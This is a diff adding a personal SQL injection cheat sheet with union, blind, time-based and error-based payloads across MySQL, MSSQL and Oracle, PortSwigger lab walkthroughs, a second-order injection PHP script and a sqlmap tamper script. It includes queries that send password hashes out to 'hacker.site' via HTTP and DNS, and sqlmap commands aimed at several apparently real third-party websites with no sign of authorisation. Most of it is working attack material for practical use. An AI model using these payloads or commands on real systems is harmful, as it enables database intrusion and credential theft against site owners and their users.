@@ -1,0 +1,848 @@
+SQL INJECTION GOLDMINE -  
+                          https://guif.re/sqli# - FAV
+						  https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+						  https://guide.offsecnewbie.com/5-sql	
+						  https://www.websec.ca/kb/sql_injection#MSSQL_String_Concatenation
+						  https://www.hackingloops.com/sql-injection-union-based-exploitation-part-2-the-injection/
+						  https://www.kali.org/tools/sqlmap/
+						  https://researchgate.net/figure/Speed-comparison-of-SQLi-techniques_tbl1_258817221#:~:text=From%20results%20given%20in%20Table,-based)%20were%20the%20slowest.
+						  https://sqlwiki.netspi.com/attackQueries/informationGathering/#mysql
+						  
+YOU CAN ENCODE IT INCLUDING THE SPACES OR TABS & YOU CAN ALSO REPLACE   WITH '
+
+http://$ip/artists.php?artist=1 -1 union select all 1,2,column_name,4 from information_schema.columns where table_schema='database' and table_name='table_name' LIMIT 1,1 -- - LIMIT 1
+
+									DBEAVER
+                              
+							  
+LIKE
+NOT LIKE
+ORDER BY game_rank DESC; | ORDER BY game_year asc
+
+---OSCP---
+admin'-- -
+username='union select 1,schema_name,3,4,5 from information_schema.schemata-- -&password=dada
+username='union select 1,table_name,3,4,5 from information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'sys' AND table_schema != 'information_schema' AND table_schema != 'performance_schema'-- -&password=dada
+username='union select 1,column_name,3,4,5 from information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'sys' AND table_schema != 'information_schema' AND table_schema != 'performance_schema'-- -&password=dada
+username='union select 1,group_concat(username,':',password,':',name),3,4,5 from users-- -&password=dada
+
+canttouchhhthiss@455152: james
+thisscanttbetouchedd@455152 cameron
+----------
+
+admin'||'1'=='1
+'OR '' = '
+  or 1=1  -- 
+  or   1"="1 -- 
+  or  1  ="1  -- 
+  || 1=1 #
+"||1#
+  or 1=1 LIMIT 1 --
+  or 1=1 LIMIT 1;#
+  or   1"="1 --
+  or  1  ="1  --
+sqlmap -r sql --dbs --dbms=mysql --proxy=http://127.0.0.1:8080 -p username -D level2 -T admins -C username --dump
+
+ISO/IEC/IEEE 12207 Systems and software engineering – Software life cycle processes is an international standard for software lifecycle processes.
+
+
+Inband - straightforward: The result of the exploitation is included directly in the response from the vul web application.
+Techniques (Most common): Union-based & Error-based.
+Out of Band (OOB)-
+Inference:
+Techniques: Boolean-based & Time-based
+
+---Information Gathering---
+*(DBMS version; Databases structure and data), Database Users and their privileges
+ | enumeration
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- | get database type and version of oracle
+
+*---DBMS 
+	MySQL	@@VERSION
+	MSSQL	@@GLOBAL.VERSION
+	Oracle	VERSION()
+	
+	MSSQL   @@VERSION
+	Oracle  version FROM v$instance
+			banner FROM V$VERSION WHERE banner LIKE 'oracle%'
+			banner FROM GV$VERSION WHERE banner LIKE 'oracle%'
+
+---Strings--
+MySQL    'Concat''enation'
+		 CONCAT('Concat','enation')
+MS SQL   'some'+'enation'
+		 CONCAT('Concat','enation')
+Oracle   'Concat' || 'enation'
+		 CONCAT('Concat','enation')
+	
+---Numeric functions
+DBMS      Numeric functions 	Results
+MySQL     CONNECTION_ID()
+		  LAST_INSERT_ID()
+	      ROW_COUNT()
+
+MS SQL	  @@PACK_RECEIVED
+		  @@ROW_COUNT
+		  @@TRANCOUNT
+
+Oracle	  BITAND(0,1)
+		  BIN_TO_NUM(1)
+		  TO_NUMBER(1231)
+		  
+
+
+Syntax (MySQL)
+1. #       SELECT * FROM Employers where username = '|' OR 2=2 #|' AND password ='';
+2. /*      SELECT * FROM Employers where username = '|' OR 2=2 /*|' AND password ='*/';    
+3. -- -    SELECT * FROM Employers where username = '|' OR 2=2 -- -|' AND password =''; 
+4. ;%00    SELECT * FROM Employers where username = '|' OR 2=2; [NULL]' AND password ='';
+
+
+...id=1
+...id=--1
+...id=-+-+1
+...id=----2---1
+
+Bitwise functions
+...id=1&1
+...id=0|1
+...id=13^12
+...id=8>>3
+...id=~-2
+
+Logical Operators
+...id=NOT 0
+...id=!0
+...id=!1+1
+...id=1&&1
+...id=1 AND 1
+...id=!0 AND !1+1
+...id=1 || NULL
+...id=1 || !NULL
+...id=1 XOR 1
+
+Regular Expression Operators
+...id={anything} REGEXP '.*'
+...id={anything} NOT REGEXP '{randomkeys}'
+...id={anything} RLIKE '.*'
+...id={anything} NOT RLIKE '{randomkeys}'
+
+Comparison Operators
+...id=GREATER(0,1)
+...id=COALESCE(NULL,1)
+...id=ISNULL(1/0)
+...id=LEAST(2,1)
+
+...id=1
+...id=--1 (You cant use equal signs in MSSQL)
+...id=-+-+1
+id=-+-+-+-+-+-+1
+id=-+-+-+-+-+-+-+-+-+1*-+-+-+-+-+-+-+-+-+1
+
+
+----Universal Whitespace Chars----
+SELECT[CHAR]name[CHAR]from[CHAR]employees
+SELECT+name FROM employees WHERE+id=1 AND+name LIKE+'J%'
+
+
+EDUCATED GUESSING FOR (MySQL)
+---/* MySQL-specific code */---
+SELECT 1 /*!50530 + 1*/ ( The contenct of the ff comment will be executed only by servers from MySQL 5.5.30 or higher)
+-- depending on the version you'll receive a 1 or 2
+
+RELEVANT ENUMERATION INFO
+-List of database schemas
+-Table 
+-Column
+-Users 
+
+Portswigger
+---MySQL---
+https://www.cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli
+MYSQL MANUAL ENUMERATION
+1' ORDER BY 1--+	#True
+1' ORDER BY 2--+	#True
+1' ORDER BY 3--+	#True
+1' ORDER BY 4--+	#False - Query is only using 3 columns
+
+#-1' UNION SELECT 1,2,3--+	True
+.web-security-academy.net/filter?category=Corporate' union select 1,version()--+-
+category=Corporate'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+-------------------------------------------------------------------------------------------------------------
+
+    Use Burp Suite to intercept and modify the request that sets the product category filter.
+
+    Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
+    '+UNION+SELECT+'abc','def'--
+
+    Use the following payload to retrieve the list of tables in the database:
+    '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+    Find the name of the table containing user credentials.
+
+    Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
+    '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+    Find the names of the columns containing usernames and passwords.
+
+    Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
+    '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+    Find the password for the administrator user, and use it to log in.
+
+-------------------------------------------------------------------------------------------------------------
+							FOR oracle
+
+
+    Use Burp Suite to intercept and modify the request that sets the product category filter.
+
+    Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
+    '+UNION+SELECT+'abc','def'+FROM+dual--
+
+    Use the following payload to retrieve the list of tables in the database:
+    '+UNION+SELECT+table_name,NULL+FROM+all_tables--
+    Find the name of the table containing user credentials.
+
+    Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
+    '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+    Find the names of the columns containing usernames and passwords.
+
+    Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
+    '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+    Find the password for the administrator user, and use it to log in.
+
+------------------------------------------------------------------------------------------------------------
+                BLIND SQL ENUMERATION - SOMTIN LIKE EWPTX
+https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+wp0qr2mj29svjliwek8l
+q6c6pzjxwokhtx5fut8k
+------------------------------------------------------------------------------------------------------------
+				ORACLE ERROR BASED BLIND SQL INJECTION - COOKIE
+https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+
+------------------------------------------------------------------------------------------------------------
+				VISIBLE ERROR-BASED SQL INJECTION
+https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based
+
+------------------------------------------------------------------------------------------------------------
+				TIME-BASED SQL INJECTION
+https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
+
+------------------------------------------------------------------------------------------------------------
+				TIME-BASED SQL INJECTION CONTENT EXTRACTION/RETRIEVAL
+https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval				
+a1ybi0xsuxhkeebn7p5k
+------------------------------------------------------------------------------------------------------------
+				Blind SQL injection with out-of-band data exfiltration
+https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+this one was injected in the cookie and password was provided
+------------------------------------------------------------------------------------------------------------
+				SQL injection with filter bypass via XML encoding - very interesting
+https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
+
+------------------------------------------------------------------------------------------------------------
+
+-To view the list of variables used --- SHOW VARIABLES
+-Set variable --- SET @myvar={expression}
+-Set variable --- SET @myvar:={expression}
+
+-OBFUSCATION - SELECT -	sElEct
+
+INFORMATION_SCHEMA - where you can retrieve all the metadata.
+SCHEMTA - Information about the other databases.
+:---SELECT schema_name FROM information_schema.schemata;
+			
+If the user running MySQL has SHOW privileges; the previous query (SELECT schema_name FROM information_schema.schemata;) can be conddesed into:	
+	  SHOW databases; 
+            OR	
+		SHOW schemas;
+		
+To obtain the default or current database name;
+		SELECT DATABASE();
+			OR
+		SELECT SCHEMA();
+
+in MySQL INFORMATION_SCHEMA, TABLES is the table that provides information about the tables in the databases managed.
+eg: SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
+				respective alias
+	SHOW TABLES; #current schema_name
+	SHOW TABLES in Employees; # other database
+	
+	COLUMNS
+	SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS;
+				respective alias
+	SHOW COLUMNS FROM DEPARTMENTS IN EMPLOYEES; #cols in a table, database
+	
+
+Functions to list current users.
+
+METHOD				
+User()				
+Current_user()
+System_user()
+Session_user()
+Current_user
+
+SELECT user FROM mysql.user; ---- if the current user is privileged
+
+Privileges are all stored within the INFORMATION_SCHEMA database
+INFORMATION_SCHEMA TABLE
+COLUMN_PRIVILEGES
+SCHEMA_PRIVLIEGES
+TABLE_PRIVILEGES()
+USER_PRIVILEGES
+
+eg: SELECT grantee,privilege_type
+	FROM INFORMATION_SCHEMA.USER_PRIVILEGES;
+	
+	SELECT grantee,table_shema, privilege_type -- privileges on databases                
+	FROM INFORMATION_SCHEMA.SCHEMA_PRIVLIEGES;
+
+Privileged Users can select the priviledges of uers from their respective columns
+
+eg: SELECT user, select_priv,..., 
+    FROM MYSQL.USER;
+
+	SELECT grantee, priviledge_type
+	FROM INFORMATION_SCHEMA.USER_PRIVILEGES
+	WHERE priviledge_type = 'SUPER'
+	
+	SELECT user FROM MYSQL.USER
+	WHERE Super_priv = 'Y';
+	
+	
+
+
+---MSSQL---
+
+-OBFUSCATION - SELECT -	sElEct
+
+...id=1
+...id=--1 (You cant use equal signs in MSSQL)
+...id=-+-+1
+id=-+-+-+-+-+-+1
+id=-+-+-+-+-+-+-+-+-+1*-+-+-+-+-+-+-+-+-+1
+
+----Universal Whitespace Chars----
+SELECT[CHAR]name[CHAR]from[CHAR]employees
+SELECT+name FROM employees WHERE+id=1 AND+name LIKE+'J%'
+
+All the system-level information is stored within the  System Tables".
+This could either exist in the MASTER database or in every database.
+		SELECT name FROM master..sysdatabases;
+			OR
+		SELECT name FROM sysdatabases;
+		
+An alternative to  System Tables  is  SYSTEM VIEWS 
+The most interesting views for this purpose are  Compatibility  and  Information_Schema 
+
+An alternative to using the  Catalog  view.
+SELECT name FROM SYS.databases;
+
+Using -- DB_NAME(id) functionality 
+SELECT DB_NAME();
+eg: SELECT DB_NAME(1);
+eg: SELECT dbid, DB_NAME(dbid) from master..sysdatabases:
+
+In SQL Server, information about the tables are stored within sysobjects.
+eg: SELECT name FROM sysobjects WHERE xtype='U'
+eg: SELECT FROM employees..sysobjects WHERE xtype='U' - From a specific database=employees
+
+xtype defines many object types:
+xtype  	Description
+S		System Table
+U 		User Table 
+TT 		Table Type 
+X		Extended Stored Procedure
+V 		Views
+
+using INFORMATION_SCHEMA views we can retrieve information about all tables and views of a current database.
+The view name is TABLE
+eg: SELECT table_name FROM INFORMATION_SCHEMA.TABLES
+					or
+    SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type = 'BASE TABLE'
+
+All tables and views of a specific database:
+SELECT table_name FROM employees.INFORMATION_SCHEMA.TABLES
+SELECT table_name FROM employees.INFORMATION_SCHEMA.TABLES WHERE table_type = 'BASE TABLE'
+
+Column Enumeration
+SELECT name FROM syscolumns
+		or
+SELECT name FROM employees..syscolumns
+
+Alternative:
+SELECT column_name FROM INFORMATION_SCHEMA.columns
+				or
+SELECT column_name FROM employees.INFORMATION_SCHEMA.columns
+				or
+SELECT column_name FROM employees.INFORMATION_SCHEMA.columns WHERE table_name='salary'
+
+
+SELECT name FROM employees..sysobjects WHERE xtype='U'
+xtype	Description
+S		System Table
+U 		User Table
+TT 		Table Type
+X 		Extended Stored Procedure
+V 		Views
+
+
+In SQL Server, the system view ALL_TAB_COLUMNS is useful in enumerating the columns of the tables, views and clusters
+accessible to the CURRENT user.
+eg: SELECT column_name FROM SYS.ALL_TAB_COLUMNS
+					or
+	SELECT column_name FROM ALL_TAB_COLUMNS
+	
+	
+	
+---CURRENT USER PROCOSSES ID---
+
+SELECT loginname FROM SYSPROCESSES
+WHERE spid = @@SPID
+
+---GETTING ALL USERS---
+SELECT name FROM SYSLOGINS
+
+
+---CURRENT ACTIVE USER---
+SELECT original_login_name FROM SYS.DM_EXEC_SESSIONS
+WHERE status='running'
+
+---UNDERSTANDING THE PRIVILEGES---
+IF IS_SRVROLEMEMBER ('sysadmin') = 1
+	print 'Current user''s login is a member of the sysadmin role'
+ELSE IF IS_SRVROLEMEMBER ('sysadmin') = 0
+	print 'Current user''s login is NOT a member of the sysadmin role'
+	
+in addition to sysadmin - serveradmin,dbcreator,setupadmin,bulkadmin,securityadmin,diskadmin,public,processadmin
+
+SELECT IS_SRVROLEMEMBER('processadmin','aw') - aw- This is the name of the SQL Server login to check. if no username is supplied as an argument, it is the currentuser.
+
+Who is the owner of what? Let's use the Sysem Table (syslogins)
+
+SELECT loginname FROM SYSLOGINS where sysadmin=1
+
+OR server_principals:
+
+SELECT name FROM SYS.SERVER_PRINCIPALS where TYPE = 'S'		
+
+		
+                                                                                                                                                                               
+			ORACLE
+-OBFUSCATION - SELECT -	sElEct
+
+			id=-(-1)
+			id=-(-1)*-(1)
+			
+DATABASE: where physical files are stored
+INSTANCE: pool of processes,memory areas etc.
+TABLESPACEs: are places where Oracle stores database objects such as tables, indexes, etc.
+SYSTEM & SYSAUX are the system TABLESPACEs created automatically at the beginning.
+
+SELECT TABLESPACE_NAME FROM USER_TABLESPACES
+--------------------------------------------
+
+-Retrieving the default TABLESPACE-
+SELECT DEFAULT_TABLESPACE FROM USER_USERS
+SELECT DEFAULT_TABLESPACE FROM SYS.USER_USERS
+where USER_USERS is the table in SYS that describes the current user.
+
+
+----Universal Whitespace Chars----
+SELECT[CHAR]name[CHAR]from[CHAR]employees
+SELECT+name FROM employees WHERE+id=1 AND+name LIKE+'J%'
+			
+
+				ORACLE
+				
+-OBFUSCATION - SELECT -	sElEct			
+
+Retrieving tables and columns in a simple query.
+eg: SELECT table_name, table_name FROM SYS.all_tables
+					or
+    SELECT table_name, table_name FROM all_tables
+
+SELECT  WAPTx  FROM DUAL; (WHERE DUAL is a Dummy Table)
+
+MSSQL-
+Enumerating the columns of the tables,views, and clusters accessible to the current user.
+SELECT column_name FROM SYS.ALL_TAB_COLUMNS
+
+
+---CURRENT USER---
+SELECT user FROM DUAL
+
+---ALL USERS---
+SELECT username FROM USER_USERS
+		or
+SELECT username FROM ALL_USERS
+
+---PRIVILEGED USERS---
+DBA_ROLE_PRIVS   - roles of users in the database.
+USER_ROLE_PRIVS  - exclusive for the current user.
+
+
+---CURRENT USER'S SESSION PRIVILEGES---
+SELECT role FROM SESSION_ROLES	
+
+--- Overview of all the data dictionaries---
+SELECT * FROM DICTIONARY
+		or 
+SELECT * FROM DICT
+
+
+
+
+
+									-------------GENERAL OBFUSCATION----------
+								SELECT 'admin' = 'ąďṁĩň' #TRUE
+								SELECT 'He\'llo'
+								SELECT 'He\%\_llo'
+								SELECT 'He''llo'
+								SELECT  He""llo 
+								SELECT '\H\e\l\l\o'
+								SELECT 'He\ll\o'
+								SELECT 'He''llo'
+								SELECT 'He' 'll' 'o'
+						SELECT CONCAT('He','ll','o')
+						SELECT CONCAT_WS('','He','ll','o')
+						SELECT 'He'/**/'ll'/**/'o'
+						SELECT	/**//**/'He'/'ll'/**/'o'/**/
+						SELECT  /*!10000 'He' */'ll'/*****/'o'/*****/
+						SELECT 'He'+'ll'+'o'
+						SELECT CONCAT('He','ll','o')
+						SELECT 'He'/**/+/**/'ll'/**/+'o'
+						SELECT CONCAT(/**/'He',/**/l/**/,/**/'lo'/**/)
+						SELECT values from'table'where/**/1
+						SELECT(values)from(table)where(1)
+						SELECT values"''from'table'where(1)
+						SELECT+"values"%A0from'table'
+						
+						s = %73 > %2573
+						WHERE ID=x && 1=1 | WHERE ID=x && 1=1
+						WHERE ID=x || 1=1 | WHERE ID=x OR 1=1
+						
+						Use GROUP BY or HAVING or GROUP_CONCAT when WHERE is filtered out
+				
+										ORACLE
+						SELECT 'He'||'ll'|'o'
+						SELECT CONCAT('He','llo')
+						SELECT NVL('Hello','Goodbye')
+						SELECT q'[]||'He'||'ll'/**/||'o'
+						SELECT CONCAT(/**/'He'/**/,/**/'ll'/**/)
+								
+
+								---------------------- ATTACKING-------------------
+													   ORACLE
+HTTP ATTACK: UTL_HTTP packate & HTTPURIType package(a subtype of URIType)
+
+REQUEST-UTL_HTTP - eg:          SELECT UTL_HTTP.REQUEST
+					        ('hacker.site/'|| (SELECT spare4 FROM SYS.USER$ WHERE ROWNUM=1))
+						           FROM DUAL;
+
+REQUEST_PIECES - UTL_HTTP - 	CREATE 	OR 	REPLACE FUNCTION readfromweb (url VARCHAR2)
+									RETURN CLOB
+								IS
+									pcs UTL_HTTP.HTML_PIECES;
+									retv CLOB;
+								BEGIN 
+									pcs := UTL_HTTP.request_pieces (url,50)
+									FOR i IN 1..pcs.COUNT
+									LOOP
+										retv := retv || pc (i);
+									END LOOP;
+									RETURN retv;
+								END;
+							
+					
+HTTPURITYPE ----> 
+							
+								SELECT HTTPURITYPE
+				('hacker.site/'|| (SELECT spare4 FROM SYS.USER$ WHERE ROWNUM=1)).getclob()
+								FROM DUAL;
+								
+other methods like GETBLOB(), GETXML() and GETCONTENTTYPE() can be used.
+
+
+
+
+
+
+------------------------PROVOKING DNS requests-------------------
+								--MySQL--
+MySQL (win)-SELECT LOAD_FILE()
+			SELECT LOAD_FILE("C:\\Windows\\system.ini");
+							OR
+					SELECT LOAD_FILE(CONCAT('\\\\',
+			'SELECT password FROM mysql.user WHERE user=\'root\'',
+					'.hacker.site'));
+				
+								--MSSQL--
+				eg:	EXEC MASTER..XP_FILEEXIST 'C:\Windows\system.ini'
+XP_FILEEXIST alternative: XP_DIRTREE & XP_SUBDIRS
+					DECLARE @host varchar(1024);
+					
+					SELECT @host=(SELECT TOP 1
+					MASTER.DBO.FN_VARBINTOHEXTR(password_hash)
+					FROM SYS.SQL_LOGINS WHERE name='sa')
+					+'.hacker.site';
+					
+					EXEC('MASTER..XP_FILEEXIST "\\'+@host+'"');
+			
+
+			
+						----ORACLE----
+	SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.hacker.site') FROM DUAL
+	SELECT UTL_INADDR.GET_HOST_NAME((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.hacker.site') FROM DUAL
+
+	HTTPURITYPE.GETBLOB, UTL_HTTP.REQUEST & DBMS_LDAP.INIT can also be used.
+									
+									
+									
+						curl https://www.mitsubishi-motors.co.za/wp-json/wp/v2/users			
+									
+									
+									
+Answers :
+1. ' UNION SELECT user(); -- - |  Mozilla Firefox
+2. AlienBrowser ' or 'elscustom'='elsFALSE	| 984								
+									
+								
+									
+									curl -i -s -k  -X $'POST' \
+    -H $'Host: me.terahost.exam' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 152' -H $'Origin: http://me.terahost.exam' -H $'Connection: close' -H $'Referer: http://me.terahost.exam/register' -H $'Cookie: _sid_=7tia1ffqor7j9rdvhc7ifpigl1' \
+    -b $'_sid_=7tia1ffqor7j9rdvhc7ifpigl1' \
+    --data-binary $'name=kojo\'%2b(select*from(select(sleep(20)))a)%2b\'&surname=Amoako&email=test%40gmail.com&street_address=tetra+city&city=city&zip=9090&password=Password1' \
+    $'http://me.terahost.exam/register-user'
+									
+					https://iml.npa-enterprise.com/NPAAPILIVE/Home/CreateClaims?lngCompanyId=1&szITSfromPersol=Persol Systems Limited&strGroupBy=PPMC&strGroupBy1=BDC&strQuery1= AND psOrderMaster.dReleaseDate = *&strQuery2= AND psOrderMaster.dReleaseDate = *&strQuery3=JULY 2021&strQuery4=&strPicHeight=1&szPicWeight=1&intPeriodID=409&iUserId=71684&iAppId=4				
+									
+				http://me.terahost.exam/register-user					
+									
+									
+										           ATTACKS 
+									eg: https://guide.offsecnewbie.com/5-sql	
+										https://guif.re/sqli#
+										
+
+									
+		' UNION SELECT user(); -- -  | OR | sqlmap -u 'http://1.sqli.labs/' -p user-agent --random-agent --banner	
+											sqlmap -u '10.100.13.37' -p user-agent --random-agent --banner
+											sqlmap --wizard
+
+		toyota%27)/**/AND/**/(SELECT/**/6656/**/FROM/**/(SELECT(SLEEP(20-(IF(96=21,0,5)))))fztb)/**/AND/**/(%27QGrw%27=%27QGrw  -----MariaDB								
+		' AND (SELECT 1129 FROM (SELECT(SLEEP(20)))FGOZ)-- LGsm | OR (TIME BASED) | 
+		'%2b(select*from(select(sleep(2)))a)%2b' or '%2b(select*from(select(sleep(10)))sup)%2b'
+		'%20and%20(select*from(select(sleep(20)))a)--%20
+		'%2b(select*from(select(if(length(database())='8',sleep(20),false)))a)%2b' - enumerating length of database name  https://hackerone.com/reports/1018621
+		+(select*from(select(if(length(database())='8',sleep(2),false)))a)+ -- https://hackerone.com/reports/1018621
+		'*updatexml(1,concat(0x7e,(select(@@version_compile_os)),0x7e),1)*'
+
+		' UNION SELECT @@VERSION; -- -
+		' UNION SELECT GROUP_CONCAT(table_name) from information_schema.tables where table_schema = SCHEMA(); -- - 
+
+									ERROR BASED (1='1 is normally filtered out so use)
+		 ' or 'elscustom'='elsFALSE  | OR | ' or 'elscustom'='elscustom
+		 sqlmap -u 'http://2.sqli.labs/' -p user-agent --user-agent=elsagent --technique=B --banner
+		 
+		 
+		 -----------SECOND ORDER SCRIPT---------
+		 
+		 <?php
+		 
+		 if(empty ($_GET['payload'])) die ("The payload please!!");
+		 
+		 /****************************
+		 CONFIGURATIONS
+		 ****************************/
+		 
+		 # File name aka our SQLi payload
+		 $payload = $_GET['payload'];
+		 
+		 #Target POST aka where upload our images
+		 $injectionURL = 'http://selfie4you.site/upload.php';
+		 
+		 #Target GET aka page with the results of the SQLi (GET)
+		 $resultsURL =  http://selfie4you.site/view.php?file=".urlencode($payload);
+		 
+		 #IMG to upload (Base64 encoded)
+		 $img = '/9g=';
+		 
+		 /********************************/
+		 
+		 /*****************************
+		 POST GENERATOR
+		 *****************************/
+		 
+		 # We have to build a custom HTTP post request with our payload as filename
+		 # (Form-based File upload in HTML - RFC1867)
+		 
+		 # Boundary for the multipart POST
+		 $boundary =  2ndOrderPAYLOAD";
+		 
+		 #Decode the data
+		 $img_raw = base64_decode($img);
+		 
+		 //Data POST body
+		 $postbody = <<<POSTBODY
+		 --{$boundary}
+		 Content-Disposition: form-data; name="file"; filename="{$payload}" Content-Type: image/jpeg
+		 
+		 {$img_raw}
+		 
+		 --{$boundary}--
+		 
+		 
+		 POSTBODY;
+		 
+		 #
+		 // POST HEADERS
+		 //http://haacked.com/archive/2004/05/15/http-web-request-expect-100-continue.aspx
+		 $headers = array(
+			 Expect: 100-continue",
+			 Content-Type: multipart/form-data; boundary={$boundary}", //change Content-Type
+			);
+			
+		/*********************
+		POST MAKER!
+		**********************
+		//CURL Handler
+		$ch = curl_init();
+		// CURL options
+		// Set CURL to POST
+		curl_setopt($ch, CURLOPT_POST, true);
+		//CURL POST URL
+		curl_setopt($ch, CURLOPT_URL, $injectionURL);
+		//We do not want to reflect the output of the POST to sqlmap
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+		//HEADERS
+		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+		//Body
+		curl_setopt($ch,  CURLOPT_POSTFIELDS, $postbody);
+		
+		// Do the actual POST
+		$result = curl_exec($ch);
+		curl_close($ch);
+		
+		/*********************
+		REFLECT THE RESULT FOR AUTOMATION
+		*********************************/
+		
+		$injectionresponse = file_get_contents($resultsURL);
+		echo $injectionresponse;
+		
+		 
+		 
+		 ?>
+		 
+		 
+		 
+		 
+		 
+		 
+		 
+		 
+		 1.  ' UNION SELECT user(); -- -
+		 2. ' or 'elscustom'='elscustom
+		 3. '/**/UNION/**/SELECT/**/@@version;#
+		 4. 'UNION(select('PoC String'));#
+		 5. 'union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
+		 6. 'union(SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='secretcustomers'));#
+		 7.  UNION(select('PoC String'));#
+		 8.  union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
+		 9. ' UNiOn seLect @@versiOn;# 
+		10. The only way to get around this kind of filtering during the exploitation automation phase is to use DifFeReNt CaSe for every letter
+		You have to write a simple tampering script:	
+
+		https://lucadidomenico.medium.com/how-to-write-custom-tamper-scripts-for-sqlmap-93927808809e
+		
+		#!/usr/bin/env python
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    """
+    Replaces each keyword a CaMeLcAsE VeRsIoN of it.
+
+    >>> tamper('INSERT')
+    'InSeRt'
+    """
+
+    retVal = str()
+
+    if payload:
+        for i in xrange(len(payload)):
+            if (i % 2 == 0):
+                # We cannot break 0x12345
+                if not ((payload[i] == 'x') and (payload[i-1] == '0')):
+                    retVal += payload[i].upper()
+                else:
+                    retVal += payload[i]
+            else:
+                retVal += payload[i].lower()
+    return retVal
+	
+https://www.coinitrewards.co.za/admin/correspondence/18*	--- when there are no parameters
+sqlmap -u "https://www.masterclass.com/api/v1/products/10?upsell=%5B%22annual-pass%22%5D" --level=5 --risk=3 --technique=BEUT --random-agent --proxy=http://127.0.0.1:8080 --ignore-code=403,429 --tamper=space2comment,between,randomcase,space2mysqldash --batch --flush-session --force-ssl
+sqlmap http://192.168.203.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5  -D zm --tables --threads 5
+sqlmap -r sql --dbs --dbms=mysql --proxy=http://127.0.0.1:8080 -p limit -D -level=2 -T admins -C username --dump
+sqlmap -r test --dbs --dbms=mssql --proxy=http://127.0.0.1:8080 -p Region --technique=T --level=5 --risk=3 --time-sec=10 --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,percentage,randomcase,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+sqlmap -r test --dbs --dbms=mssql --proxy=http://127.0.0.1:8080 -p log --level=5 --risk=3 --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+sqlmap -r sql --dbms=MariaDB --proxy=http://127.0.0.1:8080 -p search --batch --banner --technique=T --tamper=space2comment --level 5 --risk 3 --time-sec=10
+sqlmap -r sql --dbms=MariaDB --proxy=http://127.0.0.1:8080 -p search --batch --tamper=space2comment --level=5 --risk 3 --time-sec=10 -D imperial_db --passwords --no-cast --technique=B --dump
+sqlmap -r sql --dbms=MariaDB --proxy=http://127.0.0.1:8080 -p search --batch --tamper=space2comment --level=you5 --risk 3 --time-sec=10 -D imperial_db --no-cast --technique=B --thread=10 --sql-shell
+- filtered attack - sqlmap -r test --dbs --dbms=mssql --proxy=http://127.0.0.1:8080 -p password --level=5 --risk=3 --time-sec=10 --tamper=charencode,appendnullbyte,escapequotes --flush-session --current-user --is-dba --parse-errors -v 3 --hex
+*** You can inspect the content of traffic file (-t traffic.txt) or use --parse-errors ***
+
